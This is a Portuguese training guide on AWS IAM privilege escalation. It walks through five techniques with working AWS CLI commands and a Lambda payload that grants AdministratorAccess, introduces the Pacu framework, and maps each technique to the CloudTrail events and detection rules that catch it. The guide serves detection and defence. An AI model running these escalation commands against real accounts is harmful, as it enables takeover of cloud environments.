# Guia S03 — Segurança ofensiva: escalação de privilégios IAM

**Depende de:** Base de IAM existente (Security Specialty). S01 e S02 úteis para perspectiva de detecção, mas não bloqueantes.  
**Usada por:** S06 (exfiltração S3), S07 (CloudTrail Lake queries), S09 (threat modeling)

> **Aviso de contexto:** O conhecimento ofensivo desta sessão é a base que torna S06, S07 e S09 concretamente úteis — ao modelar ameaças ou escrever queries de detecção, você precisará saber *o que o atacante faz* antes de saber *o que detectar*.

---

## Orientação para a sessão

- **0–10 min** → Parte 1: modelo mental de escalação de privilégios IAM
- **10–45 min** → Parte 2: as 5 técnicas — permissão mínima + mecanismo + CloudTrail
- **45–55 min** → Parte 3: Pacu — o framework e seus módulos de privesc
- **55–65 min** → Tabela consolidada + exercício de reflexão

---

## Parte 1 — Modelo mental: o que é escalação de privilégios IAM

### 1.1 Definição operacional

[FATO] Escalação de privilégios (privilege escalation, privesc) em IAM ocorre quando um principal (usuário, role, serviço) usa as permissões que já possui para adquirir permissões adicionais que não lhe foram explicitamente concedidas — tipicamente chegando a `AdministratorAccess` ou equivalente.

A condição necessária é: o principal tem pelo menos **uma permissão que afeta a superfície de controle do IAM ou do mecanismo de execução de código com role privilegiada**.

### 1.2 Os dois eixos de escalação

```
EIXO 1 — Manipulação direta de políticas IAM:
  Alterar quem pode fazer o quê, sem usar infraestrutura

  Exemplos:
  ├── Criar nova versão de política com * (iam:CreatePolicyVersion)
  ├── Anexar AdministratorAccess ao próprio usuário (iam:AttachUserPolicy)
  └── Criar inline policy com * (iam:PutUserPolicy)


EIXO 2 — Execução de código com role privilegiada:
  Criar ou usar um recurso de computação associado a uma role
  mais privilegiada do que a do atacante, e executar código nele

  Exemplos:
  ├── Lambda com execution role privilegiada (iam:PassRole + lambda:CreateFunction)
  ├── EC2 com instance profile privilegiado (iam:PassRole + ec2:RunInstances)
  ├── ECS task com task role privilegiada (iam:PassRole + ecs:RunTask)
  └── CloudFormation com role privilegiada (iam:PassRole + cloudformation:CreateStack)
```

[CONSENSO] A pesquisa da Rhino Security Labs (Spencer Gietzen, 2018, atualizada continuamente) documentou 21+ métodos. O princípio comum a todos: IAM é um sistema de autorização, e qualquer permissão que modifique *quem pode fazer o quê* ou *o que executa com quais credenciais* é potencialmente um vetor de escalação.

### 1.3 A permissão mais perigosa que não parece ser

[FATO] `iam:PassRole` é a permissão que autoriza um principal a associar uma IAM role a um serviço AWS (Lambda, EC2, ECS, Glue, etc.). Sem `iam:PassRole`, você não consegue criar um recurso de computação com uma role que não seja a sua.

[CONSENSO] `iam:PassRole` sem restrição de `iam:PassedToService` (condition key) é considerado um risco de escalação de privilégios praticamente garantido se o principal também tiver permissões de criar recursos de computação. Esta é uma das configurações mais frequentemente mal-compreendidas em IAM.

---

## Parte 2 — As 5 técnicas

> **Nota sobre precisão:** As técnicas T1–T5 são baseadas na pesquisa documentada da Rhino Security Labs e hackingthe.cloud, que são referências primárias neste espaço. Os nomes de API e eventos CloudTrail são [FATO] para as APIs atuais AWS; os nomes de evento no CloudTrail estão marcados como [INCERTO] onde há variação conhecida por versão de API.

---

### T1 — `iam:CreatePolicyVersion`

**Mecanismo:**

[FATO] Políticas gerenciadas IAM suportam até 5 versões simultâneas. A versão marcada como `default` é a que está em vigor. Com `iam:CreatePolicyVersion`, um atacante pode:

1. Identificar uma managed policy anexada ao próprio usuário/role que ele pode modificar
2. Criar uma nova versão dessa política com conteúdo `{"Effect":"Allow","Action":"*","Resource":"*"}`
3. Definir a nova versão como default com o parâmetro `--set-as-default`

```bash
# Criar nova versão da política com permissão total e defini-la como default
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/RestrictedPolicy \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default
```

**Permissão mínima necessária:** `iam:CreatePolicyVersion`

**Restrição:** [FATO] O atacante só pode criar versões de políticas que ele tem acesso para modificar — em geral, políticas customer managed (não AWS managed, que são read-only para o usuário). Ele precisa ter o ARN da política alvo.

**CloudTrail events gerados:**
- `CreatePolicyVersion` — registra PolicyArn, nova versão, e se foi definida como default

**GuardDuty finding relacionado:** Não há finding GuardDuty direto para `CreatePolicyVersion`. [CONSENSO] A detecção primária é via AWS Config rule (ex: `iam-policy-no-statements-with-admin-access`) ou via CloudTrail + alarme CloudWatch para este evento específico.

**Variante mais furtiva — `iam:SetDefaultPolicyVersion`:**

[FATO] Se a política-alvo já tem uma versão mais permissiva em estado não-default (versão antiga que foi "downgraded"), o atacante pode simplesmente trocar a versão default sem criar conteúdo novo:

```bash
aws iam set-default-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/RestrictedPolicy \
  --version-id v1
```

CloudTrail event: `SetDefaultPolicyVersion`. Esta variante não cria nenhum conteúdo novo — apenas muda um ponteiro — o que a torna mais difícil de detectar como criação de backdoor.

---

### T2 — `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction`

**Mecanismo:**

[FATO] Esta é a técnica de escalação via computação mais comum e documentada. O atacante:

1. Identifica uma Lambda execution role existente mais privilegiada que a dele
2. Cria uma função Lambda passando essa role como execution role (via `iam:PassRole`)
3. Carrega código que executa ações privilegiadas (ex: cria um novo admin user, retorna credenciais temporárias via STS)
4. Invoca a função

```python
# Código da Lambda maliciosa (payload)
import boto3

def handler(event, context):
    iam = boto3.client('iam')
    # Executando com a execution role privilegiada
    iam.attach_user_policy(
        UserName='attacker',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return "escalation complete"
```

```bash
# 1. Criar a função com a role privilegiada
aws lambda create-function \
  --function-name priv-escalation \
  --runtime python3.12 \
  --role arn:aws:iam::123456789012:role/AdminRole \
  --handler index.handler \
  --zip-file fileb://payload.zip

# 2. Invocar a função
aws lambda invoke \
  --function-name priv-escalation \
  /tmp/output.txt
```

**Permissões mínimas necessárias:**
- `iam:PassRole` (com Resource sendo a role privilegiada ou `*`)
- `lambda:CreateFunction`
- `lambda:InvokeFunction`

**CloudTrail events gerados:**
- [INCERTO — verificar versão exata] `CreateFunction20150331` ou `CreateFunction` — registra FunctionName, Role ARN, código hash
- `InvokeFunction` — registra FunctionName, InvocationType
- Os eventos *gerados pela própria Lambda durante execução* são registrados **com a identidade da execution role** — ex: `AttachUserPolicy` com `userIdentity.arn` apontando para a role Lambda, não para o atacante original. [FATO] Isso cria um "salto de identidade" que pode dificultar a correlação forense.

**GuardDuty finding relacionado:**
- Se a Lambda fizer chamadas de API a partir de um IP malicioso conhecido ou com padrão anômalo, pode gerar `Recon:IAMUser/MaliciousIPCaller` ou findings relacionados à execution role
- [FATO] GuardDuty Lambda Protection (se habilitado) monitora tráfego de rede das funções Lambda durante execução — pode detectar chamadas para IPs de C2

**Por que este é o mais explorado:**
[CONSENSO] A combinação `iam:PassRole + lambda:CreateFunction` aparece frequentemente em ambientes cloud porque Lambda é um serviço amplamente usado e engenheiros costumam receber `lambda:*` para "facilitar o deploy" sem restringir `iam:PassRole` ao serviço Lambda especificamente.

---

### T3 — `iam:AttachUserPolicy` / `iam:AttachRolePolicy` / `iam:AttachGroupPolicy`

**Mecanismo:**

[FATO] Esta é a técnica mais direta quando disponível. O atacante simplesmente anexa a policy `AdministratorAccess` gerenciada pela AWS ao próprio usuário, role ou grupo:

```bash
# Escalar privilégios do próprio usuário
aws iam attach-user-policy \
  --user-name attacker \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Alternativa: escalar uma role que o atacante pode assumir
aws iam attach-role-policy \
  --role-name target-role \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

**Permissões mínimas necessárias:**
- `iam:AttachUserPolicy` (para usuários) — ou
- `iam:AttachRolePolicy` (para roles) — ou
- `iam:AttachGroupPolicy` (para grupos)

[FATO] Cada variante requer apenas a permissão específica para o tipo de principal alvo. Não é necessário ter as três.

**Variante inline (iam:PutUserPolicy / iam:PutRolePolicy):**

```bash
aws iam put-user-policy \
  --user-name attacker \
  --policy-name backdoor \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
```

[FATO] Políticas inline (put) são diferentes de managed policies (attach): inline policies não têm ARN próprio, são embutidas diretamente no principal. Isso as torna menos visíveis em auditorias que buscam managed policies.

**CloudTrail events gerados:**
- `AttachUserPolicy` — registra UserName, PolicyArn
- `AttachRolePolicy` — registra RoleName, PolicyArn
- `PutUserPolicy` — registra UserName, PolicyName, PolicyDocument
- `PutRolePolicy` — registra RoleName, PolicyName, PolicyDocument

[FATO] `PutUserPolicy` e `PutRolePolicy` registram o `PolicyDocument` completo no CloudTrail — o conteúdo `"Action":"*"` fica visível no log. Um alarme CloudWatch em `PutUserPolicy` com string match em `"Action":"*"` é uma detecção eficaz.

**GuardDuty finding:** Nenhum finding direto. Detecção primária via Config rule `iam-no-inline-policy-check` ou CloudTrail.

---

### T4 — `iam:UpdateAssumeRolePolicy` + `sts:AssumeRole`

**Mecanismo:**

[FATO] A trust policy de uma IAM role define quais principals podem assumir essa role (via `sts:AssumeRole`). Com `iam:UpdateAssumeRolePolicy`, um atacante pode modificar a trust policy de uma role privilegiada existente para adicionar o próprio principal:

```bash
# 1. Adicionar o attacker user à trust policy de uma role admin
aws iam update-assume-role-policy \
  --role-name AdminRole \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Principal": {
          "AWS": [
            "arn:aws:iam::123456789012:role/OriginalRole",
            "arn:aws:iam::123456789012:user/attacker"
          ]
        },
        "Action": "sts:AssumeRole"
      }
    ]
  }'

# 2. Assumir a role agora que a trust policy foi modificada
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/AdminRole \
  --role-session-name escalation-session
```

**Permissões mínimas necessárias:**
- `iam:UpdateAssumeRolePolicy` (na role alvo)
- `sts:AssumeRole` (geralmente disponível por default para usuários IAM)

**CloudTrail events gerados:**
- `UpdateAssumeRolePolicy` — registra RoleName e novo PolicyDocument. [FATO] Este evento é muito raro em operação normal — é um sinal de alarme forte.
- `AssumeRole` — registra RoleArn, RoleSessionName, e a identidade do principal que assumiu a role. [FATO] Eventos `AssumeRole` são gerados no endpoint STS da região chamada e também replicados para us-east-1 (STS global).

**Relação com "sts:AssumeRole abuse" mencionado no plano:**

[FATO] O "abuso de AssumeRole" pode ocorrer de duas formas distintas:
1. **Via UpdateAssumeRolePolicy** (acima) — atacante modifica a trust policy antes
2. **Exploração de trust policies permissivas já existentes** — roles com `"Principal": "*"` sem Condition, ou com `"Principal": {"AWS": "arn:aws:iam::*:root"}`, ou configuradas para cross-account sem external ID

[FATO] `AssumeRole` com `errorCode = AccessDenied` em alta frequência é o padrão de "credential enumeration/abuse" — um atacante testando sistematicamente quais roles consegue assumir. Este é o padrão exato que será detectado com a query CloudTrail Lake na S07.

**GuardDuty finding relacionado:**
- `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS` — se credenciais de instance profile forem usadas fora do ambiente AWS (indicando exfiltração das credenciais antes do AssumeRole)

---

### T5 — `iam:PassRole` + `ec2:RunInstances`

**Mecanismo:**

[FATO] Similar à técnica Lambda (T2), mas usando EC2. O atacante lança uma instância EC2 com um instance profile associado a uma role privilegiada. O código de escalação é executado via user data (bootstrap script) ou, se SSM estiver disponível, via `ssm:SendCommand`:

```bash
# Lançar EC2 com instance profile privilegiado
# O user data executa o script de escalação na inicialização
aws ec2 run-instances \
  --image-id ami-0abcdef1234567890 \
  --instance-type t3.micro \
  --iam-instance-profile Name=PrivilegedInstanceProfile \
  --user-data '#!/bin/bash
    aws iam attach-user-policy \
      --user-name attacker \
      --policy-arn arn:aws:iam::aws:policy/AdministratorAccess'
```

Variante com SSM (se `ssm:SendCommand` estiver disponível):
```bash
# Lançar a instância (com instance profile que tem SSM access)
aws ec2 run-instances --iam-instance-profile Name=SomeProfile ...

# Executar comando arbitrário via SSM com as credenciais da role
aws ssm send-command \
  --instance-ids i-0abc123 \
  --document-name AWS-RunShellScript \
  --parameters 'commands=["aws iam attach-user-policy --user-name attacker --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"]'
```

**Permissões mínimas necessárias:**
- `iam:PassRole` (para o instance profile)
- `ec2:RunInstances`
- (Opcional) `ssm:SendCommand` para execução sem user data

**CloudTrail events gerados:**
- `RunInstances` — registra ImageId, InstanceType, IamInstanceProfile. [FATO] O IamInstanceProfile é visível no evento, permitindo identificar a role privilegiada utilizada.
- `SendCommand` (SSM) — registra InstanceIds, DocumentName, Parameters
- Os eventos da escalação em si são gerados **com a identidade da instance role**, não do atacante original

**Por que é mais barulhento que T2:**
[CONSENSO] Lançar uma instância EC2 é mais visível que criar uma Lambda: gera eventos adicionais (security group associations, network interface creation, etc.) e deixa um rastro de cobrança imediato. Lambda é preferida por atacantes que querem minimizar o footprint.

---

## Parte 3 — Pacu: o framework de exploração AWS

### 3.1 O que é

[FATO] Pacu é um framework open-source de exploração AWS criado e mantido pela Rhino Security Labs. É escrito em Python 3 e projetado para pentesters testarem configurações vulneráveis em contas AWS. Funciona via módulos plugáveis.

[FATO] Confirmado no README oficial (GitHub): Pacu utiliza banco de dados SQLite local para armazenar dados coletados e minimizar chamadas de API (e portanto logs CloudTrail gerados). Tem suporte a logging de comandos para documentação de pentest.

[FATO] Instalação: `pip3 install -U pacu` ou via Docker.

### 3.2 O módulo central para privesc: `iam__privesc_scan`

[FATO] O módulo `iam__privesc_scan` é o módulo primário de escalonamento de privilégios no Pacu. [INCERTO — verificar nome exato no repositório atual; a convenção de nomes `iam__privesc_scan` é a documentada em referências técnicas, mas pode ter variado em versões recentes]

O que ele faz:
1. Enumera todas as permissões do principal atual (usuário, role, ou usuário assumindo uma role)
2. Compara com a lista de 21+ métodos de privesc documentados
3. Reporta quais caminhos de escalação estão disponíveis, quais permissões faltam para outros caminhos
4. Pode executar automaticamente o método de maior confiança

```bash
# No Pacu:
> run iam__privesc_scan
```

Output típico:
```
[privesc_scan] Checking for privilege escalation methods...

CONFIRMED - iam:CreatePolicyVersion
  Method: Create a new version of an existing policy with Admin permissions
  Required permissions present: iam:CreatePolicyVersion

POTENTIAL - iam:PassRole/lambda:CreateFunction
  Required present: iam:PassRole, lambda:CreateFunction
  Required missing: lambda:InvokeFunction
```

### 3.3 Outros módulos Pacu relevantes para esta sessão

| Módulo | O que faz | Relevância |
|--------|-----------|------------|
| `iam__enum_users_roles_policies_groups` | Enumera todos os principals e políticas da conta | Pré-requisito para entender o ambiente antes do privesc |
| `iam__backdoor_assume_role` | Adiciona um principal externo (controlado pelo atacante) à trust policy de uma role | Persistência pós-escalação; relacionado à T4 |
| `iam__backdoor_users_keys` | Cria access keys para usuários existentes | Persistência como segundo vetor de acesso |

[FATO] Pacu usa sessões isoladas (SQLite por sessão) para que múltiplos engagements de pentest não interfiram entre si. As keys AWS são armazenadas na sessão e não são transmitidas para a Rhino Security Labs.

### 3.4 Como o Pacu tenta minimizar logs CloudTrail

[FATO] O banco de dados local SQLite armazena dados já coletados para evitar re-enumerar recursos. Por exemplo: depois de rodar `iam__enum_users_roles_policies_groups`, as políticas ficam em cache local — o módulo de privesc scan não precisa fazer novas chamadas de API para acessar esses dados.

[CONSENSO] Mesmo assim, privesc via Pacu gera CloudTrail events inescapáveis: `CreatePolicyVersion`, `AttachUserPolicy`, `CreateFunction`, etc. O Pacu não silencia esses eventos — apenas evita chamadas de enumeração redundantes.

---

## Tabela consolidada: técnica → permissão → CloudTrail → detecção

| # | Técnica | Permissão mínima | CloudTrail events | Detecção via |
|---|---------|-----------------|-------------------|-------------|
| T1 | CreatePolicyVersion | `iam:CreatePolicyVersion` | `CreatePolicyVersion` | Config rule + CloudWatch alarm |
| T1b | SetDefaultPolicyVersion | `iam:SetDefaultPolicyVersion` | `SetDefaultPolicyVersion` | CloudWatch alarm (evento raro) |
| T2 | PassRole + Lambda | `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` | `CreateFunction` + `InvokeFunction` | GuardDuty Lambda Protection + CloudTrail |
| T3a | AttachUserPolicy | `iam:AttachUserPolicy` | `AttachUserPolicy` | Config rule + GuardDuty IAMUser findings |
| T3b | PutUserPolicy (inline) | `iam:PutUserPolicy` | `PutUserPolicy` | Config rule `iam-no-inline-policy-check` |
| T4 | UpdateAssumeRolePolicy + AssumeRole | `iam:UpdateAssumeRolePolicy` | `UpdateAssumeRolePolicy` + `AssumeRole` | CloudWatch alarm (evento muito raro) |
| T5 | PassRole + EC2 | `iam:PassRole` + `ec2:RunInstances` | `RunInstances` | Config + GuardDuty EC2 findings |

**Observação sobre o "salto de identidade" (T2 e T5):**

[FATO] Nas técnicas baseadas em computação (Lambda, EC2), os eventos CloudTrail da **escalação em si** são registrados com a identidade da **execution role** ou **instance profile** — não com o usuário/role original do atacante. A cadeia forense completa requer correlação entre:
1. O evento de criação do recurso (CreateFunction/RunInstances) com a identidade do atacante
2. Os eventos subsequentes com a identidade da role de execução

[CONSENSO] Esta correlação é uma das razões pelas quais o CloudTrail Lake (S07) e soluções SIEM são superiores a alarmes CloudWatch individuais para detectar estas técnicas — eles permitem queries que cruzam múltiplos eventos de fontes diferentes.

---

## Checklist de objetivos verificáveis

Ao final da sessão, você deve conseguir responder sem consultar documentação:

- [ ] Listar 5 técnicas de privesc IAM com nome das permissões necessárias para cada
- [ ] Explicar por que `iam:PassRole` sem restrição de `iam:PassedToService` é perigoso
- [ ] Descrever o "salto de identidade" em T2/T5 e por que complica a forensics
- [ ] Citar o CloudTrail event gerado por cada uma das 5 técnicas
- [ ] Explicar o que `iam__privesc_scan` faz e qual sua saída típica
- [ ] Explicar como `iam:SetDefaultPolicyVersion` é mais furtivo que `iam:CreatePolicyVersion`
- [ ] Descrever como `AssumeRole` com `errorCode = AccessDenied` em alta frequência indica enumeração

---

## Exercício de reflexão

> Você tem credenciais de um usuário IAM com as seguintes permissões e **nada mais**:
>
> ```json
> {
>   "Version": "2012-10-17",
>   "Statement": [
>     {"Effect": "Allow", "Action": ["iam:PassRole", "lambda:CreateFunction",
>      "lambda:ListFunctions", "s3:GetObject"], "Resource": "*"},
>     {"Effect": "Allow", "Action": "iam:GetRole", "Resource": "*"}
>   ]
> }
> ```
>
> **Pergunta 1:** Você consegue escalar privilégios com essas permissões? Se sim, qual técnica e quais são os passos exatos? Se não, qual permissão está faltando?
>
> **Pergunta 2:** Suponha que você adiciona `lambda:InvokeFunction` à policy acima. Você agora consegue executar uma escalação completa usando T2. Mas os eventos CloudTrail da escalação (`AttachUserPolicy`) vão mostrar qual identidade como executora? Como você correlacionaria isso com o usuário IAM original?
>
> **Pergunta 3:** Como defender contra T2 de forma precisa (sem simplesmente remover `lambda:CreateFunction`)? Escreva uma IAM condition que restrinja `iam:PassRole` apenas para o serviço Lambda, impedindo o uso com EC2 ou Glue.

---

## Referências primárias

- [Hacking the Cloud — AWS IAM Privilege Escalation (hackingthe.cloud)](https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/) — documentação colaborativa mantida ativamente; verificar data da última atualização antes de assumir completude [INCERTO quanto a técnicas específicas adicionadas pós-2025]
- [Rhino Security Labs — AWS Privilege Escalation Methods and Mitigation (Spencer Gietzen)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/) — post técnico de referência original com 21 métodos documentados; a seção de mitigação é igualmente valiosa
- [Pacu — AWS Exploitation Framework (GitHub)](https://github.com/RhinoSecurityLabs/pacu) — leia especialmente o módulo `iam__privesc_scan` e o wiki em Module Details
- [AWS IAM — PassRole documentation (docs oficiais)](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html) — comportamento oficial e como restringir com conditions
- [AWS Blog — Techniques for writing least privilege IAM policies](https://aws.amazon.com/blogs/security/techniques-for-writing-least-privilege-iam-policies/) — perspectiva defensiva complementar
